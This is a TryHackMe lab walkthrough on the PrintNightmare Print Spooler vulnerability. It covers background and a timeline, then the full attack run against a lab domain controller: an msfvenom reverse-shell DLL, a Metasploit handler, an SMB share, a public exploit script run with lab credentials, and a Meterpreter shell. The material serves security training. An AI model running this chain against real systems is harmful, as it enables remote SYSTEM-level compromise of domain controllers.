# PrintNightmare

**Room Link:** [https://tryhackme.com/r/room/printnightmarehpzqlp8](https://tryhackme.com/r/room/printnightmarehpzqlp8)

## Windows Print Spooler Service

Microsoft defines the [Print spooler service](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) as a service that runs on each computer system. As you can guess from the name, the Print spooler service manages the printing processes. The Print spooler's responsibilities are managing the print jobs, receiving files to be printed, queueing them, and scheduling.

You are able to Start/Stop/Pause/Resume the Print Spooler Service by simply navigating to Services on your Windows system.&#x20;

Services:

\


<figure><img src="https://i.ibb.co/RT53ySK/spooleerr.png" alt=""><figcaption></figcaption></figure>

Print Spooler Properties (Services):\


\


<figure><img src="https://i.ibb.co/3WPvSJY/print.png" alt=""><figcaption></figcaption></figure>

Print spooler service makes sure to provide enough resources to the computers that send out the print jobs. Remember the early days when users had to wait for print jobs to finish to perform other operations? Well, the Print spooler service took care of this issue for us.&#x20;

The Print spooler service allows the systems to act as print clients, administrative clients, or print servers. It is also important to note that the Print spooler service is enabled by default in all Windows clients and servers. It's necessary to have a Print spooler service on the computer to connect to a printer. There are third-party software and drivers provided by the printer manufacturers that would not require you to have the Print spooler service enabled. Still, most companies prefer to utilize Print spooler services.&#x20;

Domain Controllers mainly use Print spooler service for printer pruning (the process of removing the printers that are not in use anymore on the network and have been added as objects to Active Directory). Printer pruning eliminates the issue for the users reaching out to a non-existent printer.  You will know soon why we mentioned Domain Controllers.&#x20;

## Remote Code Execution Vulnerability

To better understand the PrintNightmare vulnerability (or any vulnerability), you should get into the habit of researching the vulnerabilities by reading Microsoft articles on any Windows-specific CVE or browsing through the Internet for community and vendor blogposts.

There has been some confusion if the [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) and [CVE-2021-34527 ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)are related to each other. They go under the same name: Windows Print Spooler Remote Code Execution Vulnerability and are both related to the Print Spooler.&#x20;

As [Microsoft ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)states in the FAQ, the PrintNightmare (CVE-2021-34527) vulnerability "_is similar but distinct from the vulnerability that is assigned CVE-2021-1675._ _The attack vector is different as well."_

What did Microsoft mean by the attack vector? To answer this question, let's look into the differences between the two vulnerabilities and append the timeline of events.&#x20;

Per [Microsoft's ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)definition, PrintNightmare vulnerability is _"a remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights."._

Running arbitrary code involves executing any commands of the attacker's choice and preference on a victim's machine.\
Suppose you had a chance to look at both CVE's on Microsoft. You would notice that the attack vectors for both are different.&#x20;

To exploit the CVE-2021-1675 vulnerability, the attacker would need to have direct or local access to the machine to use a malicious DLL file to escalate privileges. To exploit the CVE-2021-34527 vulnerability successfully, the attacker can remotely inject the malicious DLL file.&#x20;

Vulnerability metrics for CVE-2021-1675:

\


<figure><img src="https://i.ibb.co/fd1m86s/spooleerr1.png" alt=""><figcaption></figcaption></figure>

Vulnerability metrics for CVE-2021-34527:

<figure><img src="https://i.ibb.co/tKZMCXB/34527.png" alt=""><figcaption></figcaption></figure>

Timeline:\


June 8, 2021: Microsoft issued a patch for a privilege escalation vulnerability in the print spooler service (CVE-2021-1675).

June 21, 2021: Microsoft revised the vulnerability and changed its classification to remote code execution (RCE).

June 27, 2021: Chinese cybersecurity firm QiAnXin [published a video](https://twitter.com/RedDrip7/status/1409353110187757575) demonstrating local privilege escalation (LPE) and RCE.

July 2, 2021: Microsoft assigns a new CVE so-called PrintNightmare vulnerability in the print spooler service (CVE-2021-34527).

July 6, 2021: Microsoft released an out-of-band patch (a patch released at some time other than the normal release time) to address CVE-2021-34527 and provides additional workarounds to defend against the exploit.

What makes PrintNightmare dangerous?&#x20;

1. It can be exploited over the network; the attacker doesn't need direct access to the machine.
2. The [proof-of-concept](https://github.com/cube0x0/CVE-2021-1675) was made public on the Internet.
3. The Print Spooler service is enabled by DEFAULT on domain controllers and computers with SYSTEM privileges.

## Try it yourself!

To understand how the attack works and what logs and events are generated, you need to put the Black Hat on and run the attack on your own. But, of course, it requires permission from management to perform this attack in your employer's environment, even if it's an isolated environment.

Fret not, you can perform the attack against the attached virtual machine and not in your employer's environment.&#x20;

***

Follow the steps outlined below to exploit the Domain Controller using the Attack Box by exploiting the PrintNightmare vulnerability.&#x20;

In the sample terminal output below, the victim is `10.10.57.176`, and the attacker is `192.168.0.100`.&#x20;

Note: As a subscriber, launch the Attack Box if you haven't done so before proceeding. As a free user, this task should be completed on your local attacking machine.

Before proceeding, create 2 directories on the Desktop:

* `pn` - this will contain the exploit.
* `share` - this directory (/root/Desktop/share) will contain the malicious DLL that will be created with msfvenom. \
  \


Download CVE-2021-1675.py:

CloneCVE-2021-1675 exploit from GitHub

**Kali**

```shell-session
git clone https://github.com/tryhackme/CVE-2021-1675.git 
```

Before spinning up Metasploit, create the malicious DLL. \


Note: In the terminal outputs below the attacker is `192.168.0.100`.  You will need to replace `192.168.0.100` with your ATTACK BOX IP (or OpenVPN IP).\


You will use msfvenom to create the malicious DLL.&#x20;

Create maliciousDLLwith Msfvenom

**Kali**

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 -f dll -o /root/malicious.dll 
```

If you see a similar output when you run this command, then you should have successfully created the DLL.

Let's fire up Metasploit.

**Kali**

```shell-session
msfconsole 
```

Once Metasploit successfully loads, you need to configure the handler to receive the incoming connection from the malicious DLL.&#x20;

Run the following commands options:

* `use exploit/multi/handler`
* `set payload windows/x64/meterpreter/reverse_tcp`
* `set lhost VALUE`&#x20;
* `set lport VALUE`

Note: The value for LHOST and LPORT must be the same values you used to create the malicious DLL.&#x20;

Configure a Metasploitlistener

**Kali(msf)**

```shell-session
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set lhost $KALI
set lport 4444
```

Next, run it so it will be actively waiting for a connection.&#x20;

Start the listener to accept incoming connections

**Kali(msf)**

```shell-session
run -j 
```

The `-j` simply means to run it as a job.&#x20;

**Kali(msf)**

```shell-session
jobs
```

<figure><img src="../../.gitbook/assets/image (1116).png" alt=""><figcaption></figcaption></figure>

Great, now you'll need to host the malicious DLL in a SMB share running on the attacker box. We'll use the AttackBox in this example.

Below is how to do this with smbserver.py from Impacket.

Start the SMB share with Impacket to host the maliciousDLL

**Kali**

```shell-session
mdir /root/share
smbserver.py share /root/share/ -smb2support 
```

A brief explanation for the command in the above image:

1. This is the name of the SMB share for the exploit execution. (Example: \\\ATTACKER\_IP\share\malicious.dll)
2. This is the local folder that will store the malicious DLL. (Example: /root/Desktop/share/malicious.dll)

Before we blindly just execute an exploit at the target, let's first examine if the target fits the criteria to exploit it.

### Check if the target is vulnerable to this exploit

**Kali**

```shell-session
rpcdump.py @$VICTIM| egrep 'MS-RPRN|MS-PAR' 
```

<figure><img src="../../.gitbook/assets/image (1117).png" alt=""><figcaption></figcaption></figure>

Yep, looks good. It's finally time to run the exploit. Navigate to the location where you downloaded the exploit code from GitHub, which should be `/root/Desktop/pn/CVE-2021-1675`.&#x20;

We will use the Python script to exploit the PrintNightmare vulnerability against the Windows 2019 Domain Controller.

**Kali**

```shell-session
cd /root/CVE-2021-1675/
python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@$VICTIM '\\$KALI\share\malicious.dll'
```

A brief explanation for the command in the above image:

* python3.9 CVE-2021-1675.py -> you're instructing Python to run the following Python script. The values which follow are the parameters the script needs to exploit the PrintNightmare vulnerability successfully.
* Finance-01.THMdepartment.local -> the name of the domain controller (Finance-01) along with the name of the domain (THMdepartment.local)
* sjohnston:mindheartbeauty76@10.10.57.176 -> the username and password for the low privilege Windows user account. \

* \\\ATTACKER\_IP\_ADDRESS\share\malicious.dll -> the location to the SMB path storing the malicious DLL.&#x20;

If all goes well, you should see an output similar to the below image.

**Kali**

```shell-session
cd /root/CVE-2021-1675/
python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@$VICTIM '\\$KALI\share\malicious.dll'
```

You may see Python errors after Try 3... but they are safe to ignore.

```
On the attacker box, you should see the SMB connection calling for the malicious DLL file.
```

Victim connects to the SMB share for the maliciousDLL

```shell-session
root@attackbox:~/Desktop/pn# ...
[*] Incoming connection (10.10.57.176,55037)
[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)
[*] User FINANCE-01\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.210.90,55037)
[*] Remaining connections []
```

<figure><img src="../../.gitbook/assets/image (1118).png" alt=""><figcaption></figcaption></figure>

Lastly, you will have a successful Meterpreter session.&#x20;

<figure><img src="../../.gitbook/assets/image (1119).png" alt=""><figcaption></figcaption></figure>

**Kali(msf)**

```shell-session
sessions
sessions -i 1
shell
```

<figure><img src="../../.gitbook/assets/image (1120).png" alt=""><figcaption></figcaption></figure>



















